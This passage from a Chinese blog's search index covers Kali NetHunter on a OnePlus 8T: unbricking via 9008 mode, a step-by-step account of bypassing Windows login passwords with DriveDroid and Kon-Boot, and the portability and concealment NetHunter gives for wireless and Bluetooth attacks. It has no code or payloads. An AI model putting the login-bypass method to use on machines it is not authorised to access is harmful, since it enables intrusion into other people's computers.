src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20240707024843525.png" alt="image-20240707024843525"></p><h2 id="刷成板砖了怎么办？？？如何救？："><a href="#刷成板砖了怎么办？？？如何救？：" class="headerlink" title="刷成板砖了怎么办？？？如何救？："></a>刷成板砖了怎么办？？？如何救？：</h2><p>通过9008端口刷。</p><p>但是网上的驱动千奇百怪。有些根本用不了。笔者会在资源链接里放出驱动和 oneplus8T机型的9008刷机工具。</p><p>刷完之后对应的版本型号就是笔者上述案例里的机型型号。无需更新和降级了。</p><p>其他机型的9008刷机和9008的使用方法可以参考文章：<a href="https://onfix.cn/course/4716">9008 端口终极刷机攻略：救砖、清密码、或者定制系统刷到正常系统刷机解锁 (onfix.cn)</a></p><p><a href="https://web.vip.miui.com/page/info/mio/mio/detail?isTop=1&postId=18656253&fromBoardId=&app_version=dev.10118&ori_version=dev.1157&ori_miui_version=20.2.27&ori_android_version=10&ori_front_version=134&ref=share&from=groupmessage">9008模式深刷-刷机教程 (miui.com)</a></p><h2 id="DriveDroid-Kon-Boot绕过win11-win10-win7等等登录密码。"><a href="#DriveDroid-Kon-Boot绕过win11-win10-win7等等登录密码。" class="headerlink" title="DriveDroid+Kon-Boot绕过win11,win10,win7等等登录密码。"></a>DriveDroid+Kon-Boot绕过win11,win10,win7等等登录密码。</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>Kon-Boot 是一种绕过操作系统密码验证的工具。它通过在操作系统启动时注入内存中的特定代码来实现这个功能。Kon-Boot 不会修改硬盘上的任何文件或注册表，而是通过改变启动过程中的认证机制来临时绕过密码。</p><p>具体来说，Kon-Boot 的工作原理如下：</p><ul><li><strong>启动注入</strong>: 当系统从 Kon-Boot 启动时，它会在引导加载器阶段注入特定代码到操作系统的内存中。</li><li><strong>修改认证过程</strong>: 这个代码会改变 Windows 操作系统的认证机制，使得任何输入的密码都被认为是正确的。</li><li><strong>内存驻留</strong>: 这种修改仅驻留在内存中，并不会持久化到硬盘上。这意味着在系统重启后，如果不再使用 Kon-Boot 启动，认证机制会恢复正常。</li></ul><p>DriveDroid 是一个允许你将安卓手机变成虚拟 USB 驱动器的应用程序。它能让你从手机上的 ISO 或 IMG 文件引导电脑。这是通过在手机上挂载这些镜像文件，并让电脑将手机识别为 USB 启动设备来实现的。</p><h3 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h3><p><strong>安装和运行 DriveDroid</strong>:</p><ul><li>DriveDroid 利用安卓设备的 Root 权限来创建和管理虚拟 USB 驱动器。</li><li>通过挂载 ISO 文件，DriveDroid 可以将手机模拟成一个包含该 ISO 文件内容的 USB 驱动器。</li></ul><p><strong>加载和挂载 ISO 文件</strong>:</p><ul><li>Kon-Boot 的 ISO 文件包含启动加载器和用于修改认证过程的代码。</li><li>当 DriveDroid 挂载该 ISO 文件后，电脑会将其识别为可引导的 USB 驱动器。</li></ul><p><strong>启动并修改认证过程</strong>:</p><ul><li>在电脑 BIOS 设置中选择从 USB 设备启动后，电脑将从挂载在手机上的 Kon-Boot ISO 文件启动。</li><li>Kon-Boot 的引导加载器会首先运行，并在内存中注入修改认证过程的代码。</li><li>当 Windows 开始启动时，注入的代码会接管认证过程，使得任何输入的密码都被认为是正确的。</li></ul><p>参考链接：<a href="https://www.hackingarticles.in/bypass-windows-login-password-using-android-phone-drivedroid/">https://www.hackingarticles.in/bypass-windows-login-password-using-android-phone-drivedroid/</a></p><p><a href="https://kon-boot.com/docs/windows_guide/#whats-kon-boot-for-windows">https://kon-boot.com/docs/windows_guide/#whats-kon-boot-for-windows</a></p><p>笔者偶然间看到的文章。还没深入了解。后续研究后会出更详细的笔记。</p><h2 id="闲谈-更高版本的nethunter如何刷以及nethunter有什么好处"><a href="#闲谈-更高版本的nethunter如何刷以及nethunter有什么好处" class="headerlink" title="闲谈:更高版本的nethunter如何刷以及nethunter有什么好处"></a>闲谈:更高版本的nethunter如何刷以及nethunter有什么好处</h2><p>本人oneplus8T刷不出更高版本Android12(13)的nethunter。但是外网上有oneplus 8pro的Android12(13)的nethunter的教程。相关机型的师傅可以自行查阅。</p><p>因为遇到一些各种阻碍。我这个机型的。其他机型的师傅可以尝试尝试。参考以下视频</p><p><a href="https://www.youtube.com/watch?v=ncMjiQAMMn8">Nethunter - Kali Linux - Android 12 - Rooted Installation - Oneplus 8 pro - Step by step setup guide (youtube.com)</a></p><p>在于便捷性，隐蔽性。成本低。</p><p>便捷性和隐蔽性就在于你把提前写好的代码放在手机上。直接运行就好。并且可四处带动。相较于笔记本电脑来说。非常轻便。不会引人注目。干点恶作剧也会更加的方便。</p><p>并且很多功能比如信号模拟，蓝牙，无线等等的攻击手段。就是一种目标种类多且需要四处走动的攻击目标。带一个笔记本肯定不方便。还会显得很愚蠢</p><p>成本低在于：市面上比较成熟的hacker工具或者说玩具什么的。比如hackrf,badusb等等这些工具单独买的成本加在一起是远大于一个二手的刷了kali nethunter的手机。所以入手一个二手手机专门刷内核和kali拿来玩玩的成本更低。</p><hr><p>优秀的参考链接（懒得整理）：[<a href="https://xdaforums.com/t/rom-official-kali-nethunter-for-the-oneplus-7-oneplus-7-pro.3976357/">ROM] [Official] Kali NetHunter for the OnePlus 7 &amp; OnePlus 7 Pro | XDA Forums</a></p><p><a href="https://blog.csdn.net/a648642694/article/details/127450785">一加8 pro 刷入 kali Hunter_oneplus8 刷nethunter-CSDN博客</a></p><p>[<a href="https://xdaforums.com/t/rom-unofficial-nethunter-oneplus-8t-android-11-12-26-08-21.4324555/">ROM] [Unofficial] NetHunter [OnePlus 8T] [Android 11 &amp; 12] [26.08.21] | XDA Forums</a></p><p><a href="https://droidwin.com/how-to-make-system-partition-read-write-on-android/">How to Make System Partition Read Write on Android (droidwin.com)</a></p><p>[<a href="https://xdaforums.com/t/magisk-twrp-arm32-64-a8-universal-read-only-to-read-write-for-android-ro2rw-auto-converting-super-system-partitions-to-read-write-mode.4521131/">MAGISK][TWRP][ARM32&#x2F;64][A8+]Universal Read Only to Read Write for android (RO2RW) | Auto converting SUPER “system partitions” to read&#x2F;write mode | XDA Forums</a></p><p><a href="https://droidwin.com/how-to-install-kali-linux-nethunter-rom-on-oneplus-8-pro-8t/">How to Install Kali Linux NetHunter ROM on OnePlus 8&#x2F;Pro&#x2F;8T (droidwin.com)</a></p><p><a href="https://www.youtube.com/watch?v=ncMjiQAMMn8">Nethunter - Kali Linux - Android 12 - Rooted Installation - Oneplus 8 pro - Step by step setup guide - YouTube</a></p><p>[How To Guide - <a href="https://xdaforums.com/t/guide-how-to-make-your-system-rw-super-r-w-read-write-able.4258745/">GUIDE] How to make your System RW &#x2F; Super R&#x2F;W read&#x2F;write-able | XDA Forums</a></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nethunter       //多个标签可以这样添加 </tag>
            
            <tag> kali--- </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
  
</search>
